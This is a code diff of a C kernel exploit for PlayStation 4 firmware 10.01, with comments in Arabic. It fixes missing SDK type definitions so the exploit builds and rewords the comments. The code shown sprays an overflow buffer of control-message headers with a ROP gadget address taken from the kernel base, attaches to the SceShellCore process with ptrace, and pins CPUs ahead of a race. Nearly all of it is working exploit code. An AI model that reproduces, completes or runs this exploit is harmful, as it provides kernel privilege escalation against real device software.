@@ -1,6 +1,6 @@
 #include <ps4.h>
 
-// تعريف الهياكل يدوياً لأن المترجم يراها "Incomplete" في بعض نسخ الـ SDK
+// --- تعريف الهياكل يدوياً لضمان اكتمال الأنواع (Complete Types) ---
 struct cmsghdr {
     uint32_t cmsg_len;
     int      cmsg_level;
@@ -17,13 +17,26 @@ struct msghdr {
     int              msg_flags;
 };
 
-// --- إعدادات الاستغلال ---
+// حل مشكلة cpuset_t يدوياً لأنها غالباً مفقودة في هيدرات الـ SDK الافتراضية
+#ifndef _CPUSET_T_DECLARED
+typedef struct { uint64_t bits[16]; } cpuset_t;
+#define _CPUSET_T_DECLARED
+#endif
+
+#ifndef CPU_ZERO
+#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))
+#endif
+
+#ifndef CPU_SET
+#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
+#endif
+
+// إعدادات الاستغلال (Offsets 10.01)
 #define PS4_PAGE_SIZE 0x4000
 #define OVERFLOW_SIZE 1024 
 #define NCMSG         14
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
 
-// نستخدم PT_CONTINUE من الـ SDK، وإذا لم يوجد نستخدم القيمة القياسية 7
 #ifndef PT_CONTINUE
 #define PT_CONTINUE 7
 #endif
@@ -35,7 +48,7 @@ volatile int stop_race = 0;
 uint64_t n_tries = 0;
 uint32_t current_delay = 50;
 
-// --- 1. بناء البفر مع الرش الكثيف (Dense Spray) ---
+// --- 1. بناء البفر مع الرش الكثيف ---
 void BuildPrecisionBuffer(uint64_t kbase) {
     size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
     size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
@@ -50,7 +63,7 @@ void BuildPrecisionBuffer(uint64_t kbase) {
     uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
     uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
 
-    // الرش التصاعدي الكامل لمنع RIP: 0
+    // الرش التصاعدي: ملء المنطقة بالكامل بالعنوان لضمان عدم وجود أصفار
     for (size_t i = 0; i < OVERFLOW_SIZE - 8; i += 8) {
         *(uintptr_t *)(overflow_ptr + i) = trigger;
     }
@@ -104,18 +117,18 @@ int _main(struct thread *td) {
     (void)td;
     initKernel(); initLibc(); initSysUtil();
     
-    // استخدام دوال الـ SDK مباشرة للبحث والتعلق
+    // البحث والتعلق بـ SceShellCore باستخدام دوال الـ SDK
     int targetPID = findProcess("SceShellCore");
     if (targetPID > 0) {
         procAttach(targetPID);
-        // استدعاء ptrace من الـ SDK مع استئناف العمل
+        // استدعاء ptrace من الـ SDK لاستمرار العملية
         ptrace(PT_CONTINUE, targetPID, (void *)1, 0); 
     }
 
     uint64_t kbase = get_kernel_base();
     BuildPrecisionBuffer(kbase);
 
-    // استخدام cpuset_t والماكرو الخاص بها من الـ SDK
+    // استخدام تعريفات cpuset_t التي أضفناها بالأعلى
     cpuset_t cpuset1, cpuset2;
     CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1); 
     CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2); 
